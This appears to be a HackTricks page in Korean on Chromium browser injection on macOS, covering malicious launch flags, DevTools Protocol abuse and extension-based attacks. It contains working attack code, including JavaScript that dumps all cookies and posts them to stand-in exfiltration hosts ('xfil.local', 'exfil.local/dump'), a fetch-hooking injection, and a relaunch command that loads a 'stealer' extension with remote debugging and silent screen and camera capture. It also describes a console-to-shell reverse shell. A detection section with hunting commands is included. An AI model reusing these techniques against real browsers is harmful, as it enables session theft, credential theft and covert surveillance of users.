# macOS Chromium Injection

{{#include ../../../banners/hacktricks-training.md}}

## Basic Information

Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi, Opera와 같은 Chromium 기반 browser는 모두 동일한 command-line switches, preference files, DevTools automation interfaces를 사용합니다. macOS에서는 GUI access 권한이 있는 모든 user가 기존 browser session을 종료하고, target의 entitlements로 실행되는 임의의 flags, extensions 또는 DevTools endpoints를 사용해 다시 열 수 있습니다.

#### macOS에서 custom flags로 Chromium 실행

macOS는 각 Chromium profile마다 하나의 UI instance만 유지하므로, 일반적으로 instrumentation을 수행하려면 browser를 강제로 종료해야 합니다(예: `osascript -e 'tell application "Google Chrome" to quit'`). Attackers는 일반적으로 `open -na "Google Chrome" --args <flags>`를 사용해 browser app bundle을 수정하지 않고 arguments를 inject하여 다시 실행합니다. 이 command를 user LaunchAgent(`~/Library/LaunchAgents/*.plist`) 또는 login hook 내부에 래핑하면 reboot/logoff 후 tampered browser가 다시 생성되도록 보장할 수 있습니다.

#### `--load-extension` Flag

`--load-extension` flag는 unpacked extensions를 자동으로 로드합니다(comma-separated paths). 이를 `--disable-extensions-except`와 함께 사용하면 legitimate extensions를 차단하면서 payload만 강제로 실행할 수 있습니다. Malicious extensions는 `debugger`, `webRequest`, `cookies`와 같은 high-impact permissions를 요청하여 DevTools protocols로 pivot하고, CSP headers를 patch하거나, HTTPS를 downgrade하거나, browser가 시작되는 즉시 session material을 exfiltrate할 수 있습니다.

#### `--remote-debugging-port` / `--remote-debugging-pipe` Flags

이 switches는 TCP 또는 pipe를 통해 Chrome DevTools Protocol (CDP)을 노출하므로 external tooling이 browser를 제어할 수 있습니다. Google은 이 interface가 infostealer에 의해 광범위하게 abuse되는 것을 확인했으며, Chrome 136(March 2025)부터 browser가 비표준 `--user-data-dir`로 실행되지 않으면 default profile에 대한 switches가 무시됩니다. 이는 실제 profiles에서 App-Bound Encryption을 강제하지만, attackers는 여전히 fresh profile을 생성하고, victim이 그 안에서 authenticate하도록 유도한 뒤(phishing/triage assistance), CDP를 통해 cookies, tokens, device trust states 또는 WebAuthn registrations를 harvest할 수 있습니다.

#### `--user-data-dir` Flag

이 flag는 전체 browser profile(History, Cookies, Login Data, Preference files 등)을 attacker-controlled path로 redirect합니다. 최신 Chrome builds에서 `--remote-debugging-port`와 함께 사용하려면 필수이며, tampered profile을 격리하여 security prompts를 disable하고, extensions를 auto-install하며, default schemes를 변경하는 사전 구성된 `Preferences` 또는 `Secure Preferences` files를 배치할 수 있도록 해줍니다.

#### `--use-fake-ui-for-media-stream` Flag

이 switch는 camera/mic permission prompt를 우회하므로 `getUserMedia`를 호출하는 모든 page가 즉시 access를 얻습니다. 이를 `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk`와 같은 flags 또는 CDP `Browser.grantPermissions` commands와 결합하면 user interaction 없이 audio/video를 조용히 capture하고, desk-share를 수행하거나, WebRTC permission checks를 충족할 수 있습니다.

## Delivery & Relaunch Patterns Seen in the Wild

CDP abuse는 일반적으로 initial payload가 아니라 **post-exploitation** stage입니다. 최근 macOS developer-targeting campaign에서는 오염된 Xcode **`Run Script` build phase**(`PBXShellScriptBuildPhase`)를 사용하여 victim이 project를 단순히 clone하거나 open할 때가 아니라 **build**할 때만 code가 실행되도록 했습니다. 첫 실행 후 malware는 다른 `.xcodeproj` trees도 infect하고, malicious Git `pre-commit` hooks를 추가했으며, 더 많은 Xcode projects를 찾기 위해 ZIP archives를 검색했습니다.

Chromium abuse에서 이것이 중요한 이유는 attacker가 browser binary 자체를 patch할 필요가 없기 때문입니다. 대신 short-lived build-phase / `osascript` stager가 **browser wrapper**(LaunchAgent, login item, Dock entry, trojanized app launcher 등)를 install하여 user가 browser를 시작할 때마다 legitimate browser가 attacker-controlled flags로 다시 열리도록 할 수 있습니다.

> [!TIP]
> Developer endpoints에서는 `.pbxproj` files, `.git/hooks/pre-commit`, 그리고 `.xcodeproj`가 포함된 ZIPs에서 예상치 못한 `curl`, `osascript`, `xxd`, 중첩된 `base64` 또는 Chrome relaunch logic을 검사하십시오.

## Remote Debugging & DevTools Protocol Abuse

Chrome을 전용 `--user-data-dir` 및 `--remote-debugging-port`와 함께 다시 실행한 후에는 CDP를 통해 attach하여(예: `chrome-remote-interface`, `puppeteer` 또는 `playwright`) high-privilege workflows를 script할 수 있습니다.

- **Cookie/session theft:** `Network.getAllCookies`와 `Storage.getCookies`는 App-Bound encryption이 일반적으로 filesystem access를 차단하는 경우에도 HttpOnly values를 반환합니다. CDP가 실행 중인 browser에 decrypt를 요청하기 때문입니다.
- **Permission tampering:** `Browser.grantPermissions`와 `Emulation.setGeolocationOverride`를 사용하면 camera/mic prompts를 우회하거나(특히 `--use-fake-ui-for-media-stream`과 함께 사용), location-based security checks를 falsify할 수 있습니다.
- **Keystroke/script injection:** `Runtime.evaluate`는 active tab 내부에서 임의의 JavaScript를 실행하여 credential lifting, DOM patching 또는 navigation 후에도 유지되는 persistence beacons injection을 가능하게 합니다.
- **Live exfiltration:** `Network.webRequestWillBeSentExtraInfo`와 `Fetch.enable`은 disk artifacts를 건드리지 않고 authenticated requests/responses를 실시간으로 intercept합니다.
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Chrome 136은 기본 프로필에서 CDP를 차단하므로, 피해자의 기존 `~/Library/Application Support/Google/Chrome` 디렉터리를 staging 경로에 복사해도 더 이상 복호화된 cookies를 얻을 수 없습니다. 대신 사용자가 instrumented profile 내에서 인증하도록 social-engineer하거나(예: "도움이 되는" support session), CDP로 제어되는 network hooks를 통해 전송 중인 MFA tokens를 capture하세요.

### XCSSET-style CDP Backdoor Chain

실용적인 malware 패턴은 다음과 같습니다.

1. Chrome이 실행될 때마다 userland implant 또는 wrapper를 재시작합니다.
2. `--remote-debugging-port=<port>`와 함께 legitimate browser를 실행하고, Chrome 136 이상에서는 일반적으로 paired non-default `--user-data-dir=<dir>`도 사용합니다.
3. local CDP WebSocket에 연결하고 `Page.addScriptToEvaluateOnNewDocument`를 사용해 pre-document hook을 등록하는 helper를 시작합니다.

이 helper는 site code가 실행되기 **전에** JavaScript를 inject할 수 있으므로, 디스크의 파일을 patch하지 않고도 `window.fetch`, `XMLHttpRequest`, wallet providers 또는 autofill flows에 hook을 설치하는 데 적합합니다.
```javascript
await Page.enable();
await Runtime.enable();
await Page.addScriptToEvaluateOnNewDocument({
source: `
const oldFetch = window.fetch;
window.fetch = async (...args) => {
console.log('__HT__' + JSON.stringify(args[0]));
return oldFetch(...args);
};
`
});
Runtime.consoleAPICalled(({args}) => { /* helper parses __HT__ */ });
```
더 강력한 변형은 browser를 **host command bridge**로 전환합니다. 주입된 JavaScript가 delimiter가 표시된 `console.log`를 발생시키고, 로컬 helper가 `Runtime.consoleAPICalled`를 감시한 다음 marker를 제거하고, 나머지 내용을 host shell을 통해(예: Go의 `exec.Command`) 실행하며, 공격자의 WebSocket을 통해 stdout/stderr를 반환합니다. 이를 통해 tab 수준의 script 실행이 사실상 fileless reverse shell로 확장됩니다.

## Extension-Based Injection via Debugger API

2023년 "Chrowned by an Extension" 연구는 `chrome.debugger` API를 사용하는 malicious extension이 모든 tab에 attach하여 `--remote-debugging-port`와 동일한 DevTools 권한을 얻을 수 있음을 입증했습니다. 이는 기존의 isolation 가정(extensions는 자체 context에 머문다는 가정)을 깨뜨리고 다음을 가능하게 합니다.

- `Network.getAllCookies`/`Fetch.getResponseBody`를 사용한 조용한 cookie 및 credential theft.
- site permission(camera, microphone, geolocation) 수정 및 security interstitial 우회. 이를 통해 phishing page가 Chrome dialog를 사칭할 수 있습니다.
- `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior` 또는 `Security.handleCertificateError`를 programmatically driving하여 TLS warning, download 또는 WebAuthn prompt를 on-path tampering.

사용자 상호작용이 필요하지 않도록 `--load-extension`/`--disable-extensions-except`를 사용하여 extension을 load합니다. API를 weaponize하는 최소한의 background script는 다음과 같습니다.
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
The extension은 `Debugger.paused` events에도 subscribe하여 JavaScript variables를 읽고, inline scripts를 patch하거나, navigation 이후에도 유지되는 custom breakpoints를 설정할 수 있습니다. 모든 작업이 사용자의 GUI session 내부에서 실행되므로 Gatekeeper와 TCC가 trigger되지 않으며, 이 technique은 이미 user context에서 execution을 획득한 malware에 적합합니다.

## Detection & Hunting

- `--remote-debugging-port`, `--remote-debugging-pipe` 또는 의심스러운 `--user-data-dir`와 함께 실행된 Chromium browsers를 alert합니다. 특히 parent가 `bash`, `sh`, `osascript`, `xcodebuild` 또는 LaunchAgent helper인 경우 주의합니다.
- helper가 local CDP WebSocket을 열고, `Page.addScriptToEvaluateOnNewDocument`를 register한 다음, 장시간 유지되는 outbound WebSocket/HTTPS connection을 생성하는 짧은 chain을 확인합니다.
- browser의 `Runtime.consoleAPICalled` activity를 attacker-supplied commands를 실행하는 child shells 또는 helper processes와 correlate하여 console-to-shell bridges를 hunt합니다.
- developer Macs에서는 `.pbxproj`의 `PBXShellScriptBuildPhase` entries, Git `pre-commit` hooks, Dock/login item relaunchers 및 ZIP-contained Xcode projects를 검토하여 browser wrapper installation 여부를 확인합니다.
```bash
ps auxww | rg 'Chrome|Brave|Edge.*(--remote-debugging-port|--remote-debugging-pipe|--user-data-dir)'
lsof -nP -iTCP -sTCP:LISTEN | rg 'Chrome|Brave|Edge'
find ~/Library/LaunchAgents /Library/LaunchAgents -name '*.plist' -exec plutil -p {} \; 2>/dev/null | rg 'remote-debugging|Google Chrome|Brave|Edge'
rg -n 'PBXShellScriptBuildPhase|curl|osascript|xxd|base64' ~/Code --glob '*.pbxproj'
```
### 도구

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - payload extensions를 사용해 Chromium 실행을 자동화하고 대화형 CDP hooks를 노출합니다.
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - macOS operators를 위한 traffic interception 및 browser instrumentation에 중점을 둔 유사한 tooling입니다.
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - `--remote-debugging-port` 인스턴스가 실행 중일 때 Chrome DevTools Protocol dumps(cookies, DOM, permissions)를 script로 처리하는 Node.js library입니다.

### 예시
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
도구 링크에서 더 많은 예시를 확인하세요.

## 참고 자료

- [https://chromedevtools.github.io/devtools-protocol/v8/Runtime/](https://chromedevtools.github.io/devtools-protocol/v8/Runtime/)
- [https://chromedevtools.github.io/devtools-protocol/tot/Page/](https://chromedevtools.github.io/devtools-protocol/tot/Page/)
- [https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/](https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/)
- [https://twitter.com/RonMasas/status/1758106347222995007](https://twitter.com/RonMasas/status/1758106347222995007)
- [https://developer.chrome.com/blog/remote-debugging-port](https://developer.chrome.com/blog/remote-debugging-port)
- [https://arxiv.org/abs/2305.11506](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
